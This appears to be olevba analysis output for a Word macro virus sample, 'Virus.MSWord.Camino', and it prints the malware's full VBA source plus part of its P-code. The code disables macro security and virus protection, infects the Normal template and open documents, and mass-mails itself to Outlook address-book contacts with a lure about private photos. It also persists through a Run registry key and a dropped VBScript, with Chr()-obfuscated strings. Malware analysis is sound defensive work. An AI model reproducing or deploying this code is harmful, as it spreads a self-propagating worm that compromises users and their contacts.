olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Camino
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Camino - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Volcano.bas 
in file: ./Virus.MSWord.Camino - OLE stream: 'Macros/VBA/Volcano'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub FileOpen()
  On Error Resume Next
  Dialogs(wdDialogFileOpen).Show
  Infectar
  ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument
End Sub

Sub AutoClose()
  On Error Resume Next
  Infectar
End Sub

Private Sub Infectar()

On Error Resume Next

If System.PrivateProfileString("", "HKEY_CURRENT_USER\\Software\\Microsoft\\Office\\9.0\\Word\\Security", "Level") <> "" Then
    CommandBars("Macro").Controls("Security...").Enabled = False
    System.PrivateProfileString("", "HKEY_CURRENT_USER\\Software\\Microsoft\\Office\\9.0\\Word\\Security", "Level") = 1&
Else
    CommandBars("Tools").Controls("Macro").Enabled = False
    With Options
        .ConfirmConversions = (10 - 10)
        .VirusProtection = (10 - 10)
        .SaveNormalPrompt = (10 - 10)
        .CheckGrammarAsYouType = (10 - 10)
        .CheckGrammarWithSpelling = (10 - 10)
        .SavePropertiesPrompt = (10 - 10)
    End With
    
End If

With Application
    .ScreenUpdating = False
    .DisplayAlerts = False
    .EnableCancelKey = wdCancelDisabled
End With

Enviar

Set NT = NormalTemplate.VBProject.VBComponents
Set AD = ActiveDocument.VBProject.VBComponents
N = False: A = False: G = False

If NT.Count > 0 Then
   For c = 1 To NT.Count
      If NT.Item(c).Name = "Volcano" Then
         N = True: G = True
      End If
   Next c
End If
If N <> True Then
   AD("Volcano").Export "c:\Volcano.dll"
   Set Alvo = NormalTemplate.VBProject
End If

If AD.Count > 0 Then
   For c = 1 To AD.Count
      If AD.Item(c).Name = "Volcano" Then
         A = True: G = True
      End If
   Next c
End If

If A <> True Then
   NT("Volcano").Export "c:\Volcano.dll"
   Set Alvo = ActiveDocument.VBProject
End If

If G = True Then
   Alvo.VBComponents.Import ("c:\Volcano.dll")
   Kill ("c:\Volcano.dll")
End If

If Day(Now) = Minute(Now) Then
   Selection.Font.Name = "Arial"
   Selection.Font.Size = 9
   If Selection.LanguageID = wdBrazilianPortuguese Then
      Selection.TypeText "Você recebeu o Volcano! Tire proveito do privilégio."
   Else
      Selection.TypeText "You received the Volcano! Take advantage of the privilege."
   End If
End If

End Sub

Private Sub Enviar()

On Error Resume Next

If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\", "Volcano?") <> "...Rol12" Then
   Out = Chr(79) + Chr(117) + Chr(116) + Chr(108) + Chr(111) + Chr(111) + Chr(107) + Chr(46) + Chr(65) + Chr(112) + Chr(112) + Chr(108) + Chr(105) + Chr(99) + Chr(97) + Chr(116) + Chr(105) + Chr(111) + Chr(110)
   Map = Chr(77) + Chr(65) + Chr(80) + Chr(73)
   Dim UO As Object
   Dim MN, BS
   Set UO = CreateObject(Out)
   Set MN = UO.GetNameSpace(Map)

   If Selection.LanguageID = wdBrazilianPortuguese Then
      t = "Mensagem Importante de "
      T2 = "Este e' o documento que voce pediu...Nao mostre pra ninguem.Ative a macro para ver as fotos"
   Else
      t = "Important Message From "
      T2 = "Here is that document you asked for...Don 't show anyone else.Activate the macro to see the photos"
   End If
   
   If UO = "Outlook" Then
      MN.Logon "profile", "password"
      For y = 1 To MN.AddressLists.Count
          Set AddyBook = MN.AddressLists(y)
          x = 1
          Set BS = UO.CreateItem(0)
          For oo = 1 To AddyBook.AddressEntries.Count
              Peep = AddyBook.AddressEntries(x)
              BS.Recipients.Add Peep
              x = x + 1
              If x > 50 Then oo = AddyBook.AddressEntries.Count
          Next oo
          BS.Subject = t & Application.UserName
          BS.Body = T2
          BS.Attachments.Add ActiveDocument.FullName
          BS.Send
          Peep = ""
      Next y
      MN.Logoff
   End If
   System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\", "Volcano?") = "...Rol12"
   
   If Dir(Chr(67) + Chr(58) + Chr(92) + Chr(87) + Chr(73) + Chr(78) + Chr(78) + Chr(84) + Chr(92) + Chr(83) + Chr(89) + Chr(83) + Chr(84) + Chr(69) + Chr(77) + Chr(92) + Chr(42) + Chr(46) + Chr(42)) <> "" Then
      Caminho = Chr(67) + Chr(58) + Chr(92) + Chr(87) + Chr(73) + Chr(78) + Chr(78) + Chr(84) + Chr(92) + Chr(83) + Chr(89) + Chr(83) + Chr(84) + Chr(69) + Chr(77) + Chr(92)
   Else
      Caminho = Chr(67) & Chr(58) & Chr(92) + Chr(87) + Chr(73) + Chr(78) + Chr(68) + Chr(79) + Chr(87) + Chr(83) + Chr(92) + Chr(83) + Chr(89) + Chr(83) + Chr(84) + Chr(69) + Chr(77) + Chr(92)
   End If
   
   If System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run", Chr(86) + Chr(99) + Chr(49) + Chr(50)) <> Caminho + Chr(86) + Chr(99) + Chr(49) + Chr(50) + Chr(46) + Chr(86) + Chr(98) + Chr(115) Then
      System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run", Chr(86) + Chr(99) + Chr(49) + Chr(50)) = Caminho + Chr(86) + Chr(99) + Chr(49) + Chr(50) + Chr(46) + Chr(86) + Chr(98) + Chr(115)
      
      ActiveDocument.VBProject.VBComponents("Volcano").Export Caminho + Chr(86) + Chr(99) + Chr(49) + Chr(50) + Chr(46) + Chr(100) + Chr(108) + Chr(108)
      NormalTemplate.VBProject.VBComponents("Volcano").Export Caminho + Chr(86) + Chr(99) + Chr(49) + Chr(50) + Chr(46) + Chr(100) + Chr(108) + Chr(108)

      Open Caminho + Chr(86) + Chr(99) + Chr(49) + Chr(50) + Chr(46) + Chr(86) + Chr(98) + Chr(115) For Output As #1
      Print #1, "Set W = WScript.CreateObject(" + Chr(34) + "Word.Application" + Chr(34) + ")"
      Print #1, "W.NormalTemplate.VBProject.VBComponents.Import (" + Chr(34) + Caminho + Chr(86) + Chr(99) + Chr(49) + Chr(50) + Chr(46) + Chr(100) + Chr(108) + Chr(108) + Chr(34) + ")"
      Print #1, "W.Application.Quit"
      Close #1
   
   End If
End If
End Sub
Sub r()
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\", "Volcano?") = "rr"
End Sub

Sub ToolsMacro()
End Sub

Sub FileTemplates()
End Sub

Sub ViewVBCode()
End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: ./Virus.MSWord.Camino
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 1182 bytes
' Macros/VBA/Volcano - 10611 bytes
' Line #0:
' 	FuncDefn (Sub FileOpen())
' Line #1:
' 	OnError (Resume Next) 
' Line #2:
' 	Ld wdDialogFileOpen 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #3:
' 	ArgsCall Infectar 0x0000 
' Line #4:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed FileName 
' 	Ld wdFormatDocument 
' 	ParamNamed FileFormat 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0002 
' Line #5:
' 	EndSub 
' Line #6:
' Line #7:
' 	FuncDefn (Sub AutoClose())
' Line #8:
' 	OnError (Resume Next) 
' Line #9:
' 	ArgsCall Infectar 0x0000 
' Line #10:
' 	EndSub 
' Line #11:
' Line #12:
' 	FuncDefn (Private Sub Infectar())
' Line #13:
' Line #14:
' 	OnError (Resume Next) 
' Line #15:
' Line #16:
' 	LitStr 0x0000 ""
' 	LitStr 0x0043 "HKEY_CURRENT_USER\\Software\\Microsoft\\Office\\9.0\\Word\\Security"
' 	LitStr 0x0005 "Level"
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	LitStr 0x0000 ""
' 	Ne 
' 	IfBlock 
' Line #17:
' 	LitVarSpecial (False)
' 	LitStr 0x000B "Security..."
' 	LitStr 0x0005 "Macro"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Enabled 
' Line #18:
' 	LitDI4 0x0001 0x0000 
' 	LitStr 0x0000 ""
' 	LitStr 0x0043 "HKEY_CURRENT_USER\\Software\\Microsoft\\Office\\9.0\\Word\\Security"
' 	LitStr 0x0005 "Level"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #19:
' 	ElseBlock 
' Line #20:
' 	LitVarSpecial (False)
' 	LitStr 0x0005 "Macro"
' 	LitStr 0x0005 "Tools"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Enabled 
' Line #21:
' 	StartWithExpr 
' 	Ld Options 
' 	With 
' Line #22:
' 	LitDI2 0x000A 
' 	LitDI2 0x000A 
' 	Sub 
' 	Paren 
' 	MemStWith ConfirmConversions 
' Line #23:
' 	LitDI2 0x000A 
' 	LitDI2 0x000A 
' 	Sub 
' 	Paren 
' 	MemStWith VirusProtection 
' Line #24:
' 	LitDI2 0x000A 
' 	LitDI2 0x000A 
' 	Sub 
' 	Paren 
' 	MemStWith SaveNormalPrompt 
' Line #25:
' 	LitDI2 0x000A 
' 	LitDI2 0x000A 
' 	Sub 
' 	Paren 
' 	MemStWith CheckGrammarAsYouType 
' Line #26:
' 	LitDI2 0x000A 
' 	LitDI2 0x000A 
' 	Sub 
' 	Paren 
' 	MemStWith CheckGrammarWithSpelling 
' Line #27:
' 	LitDI2 0x000A 
' 	LitDI2 0x000A 
' 	Sub 
' 	Paren 
' 	MemStWith SavePropertiesPrompt 
' Line #28:
' 	EndWith 
' Line #29:
' Line #30:
' 	EndIfBlock 
' Line #31:
' Line #32:
' 	StartWithExpr 
' 	Ld Application 
' 	With 
' Line #33:
' 	LitVarSpecial (False)
' 	MemStWith ScreenUpdating 
' Line #34:
' 	LitVarSpecial (False)
' 	MemStWith DisplayAlerts 
' Line #35:
' 	Ld wdCancelDisabled 
' 	MemStWith EnableCancelKey 
' Line #36:
' 	EndWith 
' Line #37:
' Line #38:
' 	ArgsCall Enviar 0x0000 
' Line #39:
' Line #40:
' 	SetStmt 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	Set NT 
' Line #41:
' 	SetStmt 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	Set AD 
' Line #42:
' 	LitVarSpecial (False)
' 	St N 
' 	BoS 0x0000 
' 	LitVarSpecial (False)
' 	St A 
' 	BoS 0x0000 
' 	LitVarSpecial (False)
' 	St G 
' Line #43:
' Line #44:
' 	Ld NT 
' 	MemLd Count 
' 	LitDI2 0x0000 
' 	Gt 
' 	IfBlock 
' Line #45:
' 	StartForVariable 
' 	Ld c 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld NT 
' 	MemLd Count 
' 	For 
' Line #46:
' 	Ld c 
' 	Ld NT 
' 	ArgsMemLd Item 0x0001 
' 	MemLd New 
' 	LitStr 0x0007 "Volcano"
' 	Eq 
' 	IfBlock 
' Line #47:
' 	LitVarSpecial (True)
' 	St N 
' 	BoS 0x0000 
' 	LitVarSpecial (True)
' 	St G 
' Line #48:
' 	EndIfBlock 
' Line #49:
' 	StartForVariable 
' 	Ld c 
' 	EndForVariable 
' 	NextVar 
' Line #50:
' 	EndIfBlock 
' Line #51:
' 	Ld N 
' 	LitVarSpecial (True)
' 	Ne 
' 	IfBlock 
' Line #52:
' 	LitStr 0x000E "c:\Volcano.dll"
' 	LitStr 0x0007 "Volcano"
' 	ArgsLd AD 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #53:
' 	SetStmt 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	Set Alvo 
' Line #54:
' 	EndIfBlock 
' Line #55:
' Line #56:
' 	Ld AD 
' 	MemLd Count 
' 	LitDI2 0x0000 
' 	Gt 
' 	IfBlock 
' Line #57:
' 	StartForVariable 
' 	Ld c 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld AD 
' 	MemLd Count 
' 	For 
' Line #58:
' 	Ld c 
' 	Ld AD 
' 	ArgsMemLd Item 0x0001 
' 	MemLd New 
' 	LitStr 0x0007 "Volcano"
' 	Eq 
' 	IfBlock 
' Line #59:
' 	LitVarSpecial (True)
' 	St A 
' 	BoS 0x0000 
' 	LitVarSpecial (True)
' 	St G 
' Line #60:
' 	EndIfBlock 
' Line #61:
' 	StartForVariable 
' 	Ld c 
' 	EndForVariable 
' 	NextVar 
' Line #62:
' 	EndIfBlock 
' Line #63:
' Line #64:
' 	Ld A 
' 	LitVarSpecial (True)
' 	Ne 
' 	IfBlock 
' Line #65:
' 	LitStr 0x000E "c:\Volcano.dll"
' 	LitStr 0x0007 "Volcano"
' 	ArgsLd NT 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #66:
' 	SetStmt 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	Set Alvo 
' Line #67:
' 	EndIfBlock 
' Line #68:
' Line #69:
' 	Ld G 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #70:
' 	LitStr 0x000E "c:\Volcano.dll"
' 	Paren 
' 	Ld Alvo 
' 	MemLd VBComponents 
' 	ArgsMemCall Import 0x0001 
' Line #71:
' 	LitStr 0x000E "c:\Volcano.dll"
' 	Paren 
' 	ArgsCall Kill 0x0001 
' Line #72:
' 	EndIfBlock 
' Line #73:
' Line #74:
' 	Ld Now 
' 	ArgsLd Day 0x0001 
' 	Ld Now 
' 	ArgsLd Minute 0x0001 
' 	Eq 
' 	IfBlock 
' Line #75:
' 	LitStr 0x0005 "Arial"
' 	Ld Selection 
' 	MemLd Font 
' 	MemSt New 
' Line #76:
' 	LitDI2 0x0009 
' 	Ld Selection 
' 	MemLd Font 
' 	MemSt Size 
' Line #77:
' 	Ld Selection 
' 	MemLd LanguageID 
' 	Ld wdBrazilianPortuguese 
' 	Eq 
' 	IfBlock 
' Line #78:
' 	LitStr 0x0034 "Você recebeu o Volcano! Tire proveito do privilégio."
' 	Ld Selection 
' 	ArgsMemCall TypeText 0x0001 
' Line #79:
' 	ElseBlock 
' Line #80:
' 	LitStr 0x003A "You received the Volcano! Take advantage of the privilege."
' 	Ld Selection 
' 	ArgsMemCall TypeText 0x0001 
' Line #81:
' 	EndIfBlock 
' Line #82:
' 	EndIfBlock 
' Line #83:
' Line #84:
' 	EndSub 
' Line #85:
' Line #86:
' 	FuncDefn (Private Sub Enviar())
' Line #87:
' Line #88:
' 	OnError (Resume Next) 
' Line #89:
' Line #90:
' 	LitStr 0x0000 ""
' 	LitStr 0x002C "HKEY_CURRENT_USER\Software\Microsoft\Office\"
' 	LitStr 0x0008 "Volcano?"
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	LitStr 0x0008 "...Rol12"
' 	Ne 
' 	IfBlock 
' Line #91:
' 	LitDI2 0x004F 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x0075 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0074 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006C 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006F 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006F 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006B 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x002E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0041 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0070 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0070 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006C 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0069 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0063 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0061 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0074 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0069 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006F 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St Out 
' Line #92:
' 	LitDI2 0x004D 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x0041 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0050 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0049 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St Map 
' Line #93:
' 	Dim 
' 	VarDefn UO (As Object)
' Line #94:
' 	Dim 
' 	VarDefn MN
' 	VarDefn BS
' Line #95:
' 	SetStmt 
' 	Ld Out 
' 	ArgsLd CreateObject 0x0001 
' 	Set UO 
' Line #96:
' 	SetStmt 
' 	Ld Map 
' 	Ld UO 
' 	ArgsMemLd GetNameSpace 0x0001 
' 	Set MN 
' Line #97:
' Line #98:
' 	Ld Selection 
' 	MemLd LanguageID 
' 	Ld wdBrazilianPortuguese 
' 	Eq 
' 	IfBlock 
' Line #99:
' 	LitStr 0x0017 "Mensagem Importante de "
' 	St t 
' Line #100:
' 	LitStr 0x005B "Este e' o documento que voce pediu...Nao mostre pra ninguem.Ative a macro para ver as fotos"
' 	St T2 
' Line #101:
' 	ElseBlock 
' Line #102:
' 	LitStr 0x0017 "Important Message From "
' 	St t 
' Line #103:
' 	LitStr 0x0062 "Here is that document you asked for...Don 't show anyone else.Activate the macro to see the photos"
' 	St T2 
' Line #104:
' 	EndIfBlock 
' Line #105:
' Line #106:
' 	Ld UO 
' 	LitStr 0x0007 "Outlook"
' 	Eq 
' 	IfBlock 
' Line #107:
' 	LitStr 0x0007 "profile"
' 	LitStr 0x0008 "password"
' 	Ld MN 
' 	ArgsMemCall Logon 0x0002 
' Line #108:
' 	StartForVariable 
' 	Ld y 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld MN 
' 	MemLd AddressLists 
' 	MemLd Count 
' 	For 
' Line #109:
' 	SetStmt 
' 	Ld y 
' 	Ld MN 
' 	ArgsMemLd AddressLists 0x0001 
' 	Set AddyBook 
' Line #110:
' 	LitDI2 0x0001 
' 	St x 
' Line #111:
' 	SetStmt 
' 	LitDI2 0x0000 
' 	Ld UO 
' 	ArgsMemLd CreateItem 0x0001 
' 	Set BS 
' Line #112:
' 	StartForVariable 
' 	Ld oo 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld AddyBook 
' 	MemLd AddressEntries 
' 	MemLd Count 
' 	For 
' Line #113:
' 	Ld x 
' 	Ld AddyBook 
' 	ArgsMemLd AddressEntries 0x0001 
' 	St Peep 
' Line #114:
' 	Ld Peep 
' 	Ld BS 
' 	MemLd Recipients 
' 	ArgsMemCall Add 0x0001 
' Line #115:
' 	Ld x 
' 	LitDI2 0x0001 
' 	Add 
' 	St x 
' Line #116:
' 	Ld x 
' 	LitDI2 0x0032 
' 	Gt 
' 	If 
' 	BoSImplicit 
' 	Ld AddyBook 
' 	MemLd AddressEntries 
' 	MemLd Count 
' 	St oo 
' 	EndIf 
' Line #117:
' 	StartForVariable 
' 	Ld oo 
' 	EndForVariable 
' 	NextVar 
' Line #118:
' 	Ld t 
' 	Ld Application 
' 	MemLd UserName 
' 	Concat 
' 	Ld BS 
' 	MemSt Subject 
' Line #119:
' 	Ld T2 
' 	Ld BS 
' 	MemSt Body 
' Line #120:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	Ld BS 
' 	MemLd Attachments 
' 	ArgsMemCall Add 0x0001 
' Line #121:
' 	Ld BS 
' 	ArgsMemCall Send 0x0000 
' Line #122:
' 	LitStr 0x0000 ""
' 	St Peep 
' Line #123:
' 	StartForVariable 
' 	Ld y 
' 	EndForVariable 
' 	NextVar 
' Line #124:
' 	Ld MN 
' 	ArgsMemCall Logoff 0x0000 
' Line #125:
' 	EndIfBlock 
' Line #126:
' 	LitStr 0x0008 "...Rol12"
' 	LitStr 0x0000 ""
' 	LitStr 0x002C "HKEY_CURRENT_USER\Software\Microsoft\Office\"
' 	LitStr 0x0008 "Volcano?"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #127:
' Line #128:
' 	LitDI2 0x0043 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x003A 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x005C 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0057 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0049 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x004E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x004E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0054 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x005C 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0053 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0059 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0053 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0054 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0045 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x004D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x005C 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x002A 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x002E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x002A 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	ArgsLd Dir 0x0001 
' 	LitStr 0x0000 ""
' 	Ne 
' 	IfBlock 
' Line #129:
' 	LitDI2 0x0043 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x003A 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x005C 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0057 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0049 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x004E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x004E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0054 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x005C 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0053 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0059 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0053 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0054 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0045 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x004D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x005C 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St Caminho 
' Line #130:
' 	ElseBlock 
' Line #131:
' 	LitDI2 0x0043 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x003A 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x005C 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x0057 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0049 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x004E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0044 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x004F 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0057 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0053 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x005C 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0053 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0059 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0053 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0054 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0045 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x004D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x005C 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	Concat 
' 	St Caminho 
' Line #132:
' 	EndIfBlock 
' Line #133:
' Line #134:
' 	LitStr 0x0000 ""
' 	LitStr 0x0040 "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run"
' 	LitDI2 0x0056 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x0063 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0031 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0032 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	Ld Caminho 
' 	LitDI2 0x0056 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0063 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0031 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0032 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x002E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0056 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0062 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0073 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	Ne 
' 	IfBlock 
' Line #135:
' 	Ld Caminho 
' 	LitDI2 0x0056 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0063 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0031 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0032 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x002E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0056 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0062 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0073 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	LitStr 0x0040 "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run"
' 	LitDI2 0x0056 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x0063 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0031 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0032 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #136:
' Line #137:
' 	Ld Caminho 
' 	LitDI2 0x0056 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0063 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0031 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0032 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x002E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0064 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006C 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006C 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0007 "Volcano"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #138:
' 	Ld Caminho 
' 	LitDI2 0x0056 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0063 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0031 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0032 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x002E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0064 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006C 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006C 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0007 "Volcano"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #139:
